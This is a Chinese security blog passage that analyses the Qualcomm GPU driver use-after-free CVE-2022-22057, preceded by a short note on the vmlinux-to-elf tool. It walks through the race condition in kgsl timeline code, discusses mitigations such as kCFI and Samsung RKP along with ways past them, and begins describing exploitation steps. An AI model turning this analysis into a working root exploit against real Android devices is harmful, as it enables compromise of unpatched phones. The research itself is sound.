<h2 id="vmlinux-to-elf-强烈推荐🌟"><a href="#vmlinux-to-elf-强烈推荐🌟" class="headerlink" title="vmlinux-to-elf(强烈推荐🌟)"></a>vmlinux-to-elf(强烈推荐🌟)</h2><p>这个工具好使<a target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf%EF%BC%8C%E8%83%BD%E8%A7%A3%E6%9E%90%E5%87%BA%60boot.img%60%E4%B8%AD%E4%B8%8D%E5%B0%91%E4%B8%9C%E8%A5%BF%E3%80%82">https://github.com/marin-m/vmlinux-to-elf，能解析出`boot.img`中不少东西。</a></p>
<p>生成一个 <code>.ELF</code> 文件，您可以使用 IDA Pro 和 Ghidra 进行分析。</p>
<p>功能：</p>
<ul>
<li>将原始文件 <code>[OK blob]</code> 或 ELF 内核作为输入</li>
<li>自动检测和解包 <code>Linux</code> 内核使用的主要压缩格式 [OK]</li>
<li>输入文件中并查找嵌入内核符号表(kalls) [OK]</li>
<li>其他指令集架构、字节序位大小、依赖于的通用函数签名 [OK]</li>
<li>从 <code>kallsyms </code>中包含的符号接线器内核的表点 [OK]</li>
<li>内核为内核，提供基本解释，它考虑低基地址（现在是第一个地址）</li>
<li>解压某种类型的 Android <code>boot.img</code>文件，以一种<code>ANDROID!</code>或<code>UNCOMPRESSED_IMG</code>魔术的形式呈现 [OK]</li>
<li>使用 IDA Pro 或 Ghidra 生成可完全分析的 .ELF 文件作为输出 [OK]</li>
</ul>
<p>安装直接<code>python setup.py install</code>即可。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/WX20220623-220539@2x.png" alt="WX20220623-220539@2x"></p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/WX20220623-220748@2x.png" alt="WX20220623-220748@2x"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/06/18/Qualcomm-GPU%E9%A9%B1%E5%8A%A8UAF%E6%BC%8F%E6%B4%9E-CVE-2022-22057/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/18/Qualcomm-GPU%E9%A9%B1%E5%8A%A8UAF%E6%BC%8F%E6%B4%9E-CVE-2022-22057/" class="post-title-link" itemprop="url">Qualcomm GPU驱动UAF漏洞(CVE-2022-22057)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-06-18 16:50:51" itemprop="dateCreated datePublished" datetime="2022-06-18T16:50:51+08:00">2022-06-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-06-20 22:08:16" itemprop="dateModified" datetime="2022-06-20T22:08:16+08:00">2022-06-20</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又是一篇关于<code>Qualcomm</code>驱动程序的漏洞，然而上一篇关于驱动的漏洞还没去验证呢😮‍💨</p>
<p>今天这一篇是官员<code>Qualcomm GPU</code>的 UAF 漏洞，影响搭载了<code>Snapdragon 888</code>及以上芯片、内核版本为 5.4 及以上的设备，如S21、Galaxy Z Flip3等。</p>
<p>高通的安全公告：<a target="_blank" rel="noopener" href="https://docs.qualcomm.com/product/publicresources/securitybulletin/may-2022-bulletin.html">Qualcomm security bulletin in May 2022</a>。</p>
<h2 id="为什么要挖GPU驱动漏洞呢？"><a href="#为什么要挖GPU驱动漏洞呢？" class="headerlink" title="为什么要挖GPU驱动漏洞呢？"></a>为什么要挖GPU驱动漏洞呢？</h2><ol>
<li>GPU 驱动中有很多缓解措施；</li>
<li>2021年在野利用的 Android 0Day 漏洞有7个，其中5个是关于 GPU 驱动的；</li>
<li>GPU 驱动可以从未信任的应用沙箱中进行访问；</li>
<li>大多数的 GPU 驱动都会处理 GPU 和 CPU 之间的复杂的内存共享逻辑，处理精心制作的恶意代码将导致任意内存读写。由于攻击者滥用GPU 内存管理代码，将导致内存损坏难以检测，以及对现有的缓解措施免疫；<ol>
<li>这里有两个滥用 GPU opcode 的例子：<a target="_blank" rel="noopener" href="https://github.com/secmob/TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices/blob/master/us-20-Gong-TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices-wp.pdf">Guang Gong</a> 和 <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html">Ben Hawkes</a>。</li>
</ol>
</li>
</ol>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p>漏洞是在Qualcomm <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/tree/msm-5.4.r2">msm 5.4 kernel</a> 中引入的，增加了<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c">kgsl timeline</a>特性和一些<code>ioctl</code>。<code>msm 5.4</code> 内核对内核图形支持层（kgsl）驱动程序（位于<code>drivers/gpu/msm</code>下）进行了一些相当重要的重构，并引入了一些新功能。就是这些新功能和重构，导致了新的安全问题。其中大部分是在内部发现并修复的，然后在公告中作为安全问题公开披露。</p>
<p> <code>kgsl_timeline</code> 对象可以通过<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L323"><code>IOCTL_KGSL_TIMELINE_CREATE</code></a> 和 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L96"><code>IOCTL_KGSL_TIMELINE_DESTROY</code></a>进行创建和销毁。 <code>kgsl_timeline</code>对象在其 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.h#L26"><code>fences</code></a>字段中存储了一个 <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/v5.9/driver-api/dma-buf.html"><code>dma_fence</code></a> 对象链表。使用<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L427"><code>IOCTL_KGSL_TIMELINE_FENCE_GET</code></a> 和 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L358"><code>IOCTL_KGSL_TIMELINE_WAIT</code></a>向链表中添加<code>dma_fence</code>对象。添加的<code>dma_fence</code>对象是<code>refcounted</code>对象，<code>dma_fence_put</code>方法用于减少它们的<code>refcount</code>。</p>
<p>有趣的是， <code>timeline-&gt;fences</code> 并没有真的持有一个<code>fences</code>的<code>refcount</code>。反之，为了避免 <code>timeline-&gt;fences</code> 中的 <code>dma_fence</code> 被释放，使用了一个自定义的 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L231"><code>release</code></a> 函数： <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> ，在<code>dma_fence</code>被释放之前， <code>timeline_fence_release</code> 从 <code>timeline-&gt;fences</code> 中移除该<code>dma_fence</code>。</p>
<p>当存储在 <code>kgsl_timeline::fences</code> 中的 <code>dma_fence</code> 的<code>refcount</code>减少为0时，方法 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> 被调用，以从 <code>kgsl_timeline::fences</code> 中移除 <code>dma_fence</code> ，然后调用 <code>dma_fence_free</code> 方法释放 <code>dma_fence</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">timeline_fence_release</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_irqsave(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the fence is still on the active list, remove it */</span></span><br><span class="line">    list_for_each_entry_safe(cur, temp, &amp;timeline-&gt;fences, node) &#123;</span><br><span class="line">        <span class="keyword">if</span> (f != cur)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        list_del_init(&amp;f-&gt;node);    <span class="comment">//&lt;----- 1. Remove fence</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irqrestore(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line">    ...</span><br><span class="line">    kgsl_timeline_put(f-&gt;timeline);</span><br><span class="line">    dma_fence_free(fence);     <span class="comment">//&lt;-------    2.  frees the fence</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尽管移除操作被<code>timeline-&gt;fence_lock</code>所保护，<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L515"><code>IOCTL_KGSL_TIMELINE_DESTROY</code></a>仍然可以在 <code>dma_fence</code> 的<code>refcount</code>减少为0时，从 <code>fences</code> 中移除前，获取它的一个引用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock(&amp;timeline-&gt;fence_lock);  <span class="comment">//&lt;------------- a.</span></span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node)</span><br><span class="line">        dma_fence_get(&amp;fence-&gt;base);</span><br><span class="line">    list_replace_init(&amp;timeline-&gt;fences, &amp;temp);</span><br><span class="line">    spin_unlock(&amp;timeline-&gt;fence_lock);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123; <span class="comment">//&lt;----- b.</span></span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>kgsl_ioctl_timeline_destroy</code>中，销毁一个<code>timeline</code>之前，先将<code>timeline-&gt;fences</code>中的<code>fences</code>拷贝到<code>temp</code>中，然后从<code>timeline-&gt;fences</code>中删除（a）。由于<code>timeline-&gt;fences</code>没有保留额外的<code>fence</code>引用，<code>refcount</code>将被增加以阻止它们在<code>temp</code>中被释放。同样的，这里对 <code>timeline-&gt;fences</code> 的操作也受到<code>timeline-&gt;fence_lock</code>的保护。但是，当到达（a）时，<code>fence</code>的<code>refcount</code>已经为0了，方法 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> 还没有将其从 <code>kgsl_timeline::fences</code> 中移除时， <code>dma_fence</code> 将被移动到<code>temp</code>中，尽管此时它的引用增加了，但是也已经晚了，因为，随后方法 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> 将从 <code>kgsl_timeline::fences</code> 中移除它，无论<code>refcount</code>的值是多少。按照以下流程，UAF 将在（b）处触发。</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-1.webp" alt="Kernel-1"  />

<p>如上图所示，这是竞争的流程，通过在 <code>timeline-&gt;fence</code>中添加大量的 <code>dma_fence</code> ，可以增加<code>kgsl_ioctl_timeline_destroy</code>代码块运行的时间。如果在线程2中将 <code>timeline-&gt;fence</code>中最后一个 <code>dma_fence</code> 的<code>refcount</code>减少为0，同时保持线程1继续运行，我们可以在线程1的 <code>dma_fence_get</code> 将<code>refcount</code>加1前，调用 <code>timeline_fence_release</code> 。因为线程2也需要等待 <code>timeline-&gt;fence_lock</code>，它只有等线程1结束，才能从 <code>kgsl_timeline::fences</code> 中移除 <code>dma_fence</code> 。到那时， <code>timeline-&gt;fence</code>中所有的 <code>dma_fence</code> 都已经移动到<code>temp</code>中了。这就意味着，当线程2运行时， <code>timeline-&gt;fence</code>是一个空的链表，然后执行流程将很快到达 <code>dma_fence_free</code>。</p>
<p>简而言之，只要在 <code>timeline-&gt;fence</code>中放置足够的 <code>dma_fence</code> ，可以在<code>kgsl_ioctl_timeline_destroy</code>将 <code>timeline-&gt;fence</code>中 <code>dma_fence</code> 移动到<code>temp</code>的过程中，创造一个很大的竞争窗口，只要将 <code>timeline-&gt;fence</code>中最后一个 <code>dma_fence</code> 的<code>refcount</code>减少为0，就可以触发UAF。</p>
<h1 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h1><p>利用这个bug并不复杂，但是，有很多漏洞缓解措施，<a target="_blank" rel="noopener" href="https://source.android.com/devices/tech/debug/kcfi">kCFI</a> (Kernel Control Flow Integrity) 和 <a target="_blank" rel="noopener" href="https://android-developers.googleblog.com/2020/06/system-hardening-in-android-11.html">variable initialization</a> （这些在4.x内核中是关闭的，但是5.x内核全部开启了），还有 <a target="_blank" rel="noopener" href="https://www.samsungknox.com/en">Samsung RKP (Realtime Kernel Protection)</a> 。</p>
<h2 id="kCFI"><a href="#kCFI" class="headerlink" title="kCFI"></a>kCFI</h2><p><code>kCFI</code>可以说是最容易被绕过的缓解措施，特别是在与三星管理程序一起使用时，它保护了内核中许多重要的内存区域。<code>kCFI</code>通过限制动态调用点可以使用函数签名跳转到的位置来防止控制流被劫持。例如，在当前的漏洞中，<code>dma_fence</code>被释放后，函数<code>dma_fence_signal_locked</code>被调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);       <span class="comment">//&lt;---- free&#x27;d fence is used</span></span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>dma_fence_signal_locked</code>将调用 <code>cur-&gt;func</code> ，该函数是<code>fence-&gt;cb_list</code>列表中的一个元素：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dma_fence_signal_locked</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) &#123;</span><br><span class="line">        INIT_LIST_HEAD(&amp;cur-&gt;node);</span><br><span class="line">        cur-&gt;func(fence, cur);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有<code>kCFI</code>的话，已释放的 <code>fence</code> 将可以被<code>fake object</code>代替，意味着，包括<code>cb_list</code>和<code>func</code>，所有都是假的。只要绕过了<code>KASLR</code>，利用就十分简单了，如这个<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">利用</a>。但是由于<code>kCFI</code>，现在替换<code>func</code>的函数类型只能为 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/include/linux/dma-fence.h#L118"><code>dma_fence_func_t</code></a>。</p>
<p>之前有关于如何绕过 Samsung 控制流完整性校验（JOPP, jump-oriented programming prevention）的<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">方法</a>，但是对<code>kCFI</code>没什么作用，绕过<code>kCFI</code>的常见方法是通过<code>double free</code>去劫持释放的链表，然后使用<a target="_blank" rel="noopener" href="https://i.blackhat.com/briefings/asia/2018/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf">Kernel Space Mirroring Attack (KSMA)</a>，但是，这种方法需要大量的时间，如[Three dark clouds over the Android kernel](<a target="_blank" rel="noopener" href="https://github.com/2freeman/Slides/blob/main/PoC-2020-Three">https://github.com/2freeman/Slides/blob/main/PoC-2020-Three</a> Dark clouds over the Android kernel.pdf) 和 <a target="_blank" rel="noopener" href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Typhoon-Mangkhut-One-Click-Remote-Universal-Root-Formed-With-Two-Vulnerabilities.pdf">Typhoon Mangkhut: One-click remote universal root formed with two vulnerabilities</a> 。</p>
<p>这个bug也能提供<code>double free</code>，就是当 <code>dma_fence_put</code> 在 <code>fence</code> 被释放后调用时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base); </span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);       <span class="comment">//&lt;----- free&#x27;d fence can be freed again</span></span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述做法减少了假 <code>fence</code> 对象的<code>refcount</code>，可以控制为1，这样假 <code>fence</code> 就会再次被释放。然而，这并不能应用<code>KSMA</code>，因为这需要覆盖<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/include/asm/pgtable.h#L465"><code>swapper_pg_dir</code></a>数据结构，而这个结构是受三星管理程序保护的。</p>
<h2 id="Variable-initialization"><a href="#Variable-initialization" class="headerlink" title="Variable initialization"></a>Variable initialization</h2><p>从Android 11开始，内核可以通过启用各种内核构建标志来实现自动变量初始化。例如，以下是Z Flip3的构建配置：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Memory initialization</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">CONFIG_CC_HAS_AUTO_VAR_INIT_PATTERN=y</span></span><br><span class="line"><span class="string">CONFIG_CC_HAS_AUTO_VAR_INIT_ZERO=y</span></span><br><span class="line"><span class="comment"># CONFIG_INIT_STACK_NONE is not set</span></span><br><span class="line"><span class="comment"># CONFIG_INIT_STACK_ALL_PATTERN is not set</span></span><br><span class="line"><span class="string">CONFIG_INIT_STACK_ALL_ZERO=y</span></span><br><span class="line"><span class="string">CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</span></span><br><span class="line"><span class="comment"># CONFIG_INIT_ON_FREE_DEFAULT_ON is not set</span></span><br><span class="line"><span class="comment"># end of Memory initialization</span></span><br></pre></td></tr></table></figure>

<p>这个特征除了保护未初始化的变量以外，还使得替换对象变得困难。特别是，它不再可能执行部分对象替换，即只替换对象的第一个字节，而对象的其余部分仍然有效。如堆喷，<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">Mitigations are attack surface, too</a>将不再可能。</p>
<p>这个特性将使得这个bug不能进行堆喷。</p>
<h2 id="kfree-rcu"><a href="#kfree-rcu" class="headerlink" title="kfree_rcu"></a>kfree_rcu</h2><p>这不是一个缓解措施，之所以提，是因为它有些类似已提出的 UAF 缓解措施的作用。这个bug中， <code>fence</code> 被 <code>dma_fence_free</code> 释放，不同于常规的 <code>kfree</code>，这里是使用 <code>kfree_rcu</code>。简单来说，<code>kfree_rcu</code>并不直接释放掉对象，只是在遇到某些情况时再进行释放。这有点像一个延迟释放，在对象被释放的时间上引入了一个不确定性（这和 <a target="_blank" rel="noopener" href="https://source.android.com/devices/tech/debug/scudo">Scudo</a>分配器的UAF缓解措施类似），这种不确定性对这个bug的利用还是很有阻碍（竞争窗口很紧张）的。</p>
<p>然而，有许多操纵竞争窗口大小的原语，比如<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html">Racing against the clock—hitting a tiny kernel race window</a>和[Exploiting race conditions on (ancient) Linux](<a target="_blank" rel="noopener" href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019">https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019</a> - Exploiting race conditions on Linux.pdf)中的技术，（两者都是由Jann Horn编写的，较早的技术被用于利用当前的bug）任何紧张的竞争窗口都可以被做得足够大，以允许由<code>kfree_rcu</code>引起的延迟，以及随后的对象替换。</p>
<h2 id="Samsung-RKP-Realtime-Kernel-Protection"><a href="#Samsung-RKP-Realtime-Kernel-Protection" class="headerlink" title="Samsung RKP (Realtime Kernel Protection)"></a>Samsung RKP (Realtime Kernel Protection)</h2><p><code>RKP</code>保护内存不被写入，这可以防止进程覆盖自己的证书成为<code>root</code>，也可以保护<code>SELinux</code>设置不被覆盖。它还可以防止内核代码区和其他重要对象，如内核页表，被覆盖。不过在实践中，一旦实现了任意的内核内存读写（受<code>RKP</code>限制），就有办法绕过这些限制。例如，<code>SELinux</code>规则可以通过覆盖<code>avc</code>缓存来修改（例如，见Valentina Palmiotti的这个<a target="_blank" rel="noopener" href="https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/selinux_bypass.c">利用</a>），而获得<code>root</code>可以通过<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">hijacking other processes that run as root</a>实现。</p>
<p>在这个bug中，<code>RKP</code>与<code>kCFI</code>合作，防止任意函数调用。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Adding-dma-fence-to-timeline-fences"><a href="#Adding-dma-fence-to-timeline-fences" class="headerlink" title="Adding dma_fence to timeline-&gt;fences"></a>Adding <code>dma_fence</code> to <code>timeline-&gt;fences</code></h2><p>有两个选项可以将<code>dma_fence</code>对象添加到<code>kgsl_timeline</code>中，第一个是使用<code>IOCTL_KGSL_TIMELINE_FENCE_GET</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_fence_get</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    timeline = kgsl_timeline_by_id(device, param-&gt;timeline);</span><br><span class="line">    ...</span><br><span class="line">    fence = kgsl_timeline_fence_alloc(timeline, param-&gt;seqno); <span class="comment">//&lt;----- dma_fence created and added to timeline</span></span><br><span class="line">    ...</span><br><span class="line">    sync_file = sync_file_create(fence);</span><br><span class="line">    <span class="keyword">if</span> (sync_file) &#123;</span><br><span class="line">        fd_install(fd, sync_file-&gt;file);</span><br><span class="line">        param-&gt;handle = fd;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>kgsl_timeline_fence_alloc</code>创建一个<code>dma_fence</code>，并将其添加到<code>timeline</code>上。然后调用者得到一个与<code>dma_fence</code>对应的<code>sync_file</code>的文件描述符。当<code>sync_file</code>被关闭时，<code>dma_fence</code>的<code>refcount</code>被减少到0。</p>
<p>第二个是 <code>IOCTL_KGSL_TIMELINE_WAIT</code>：</p>
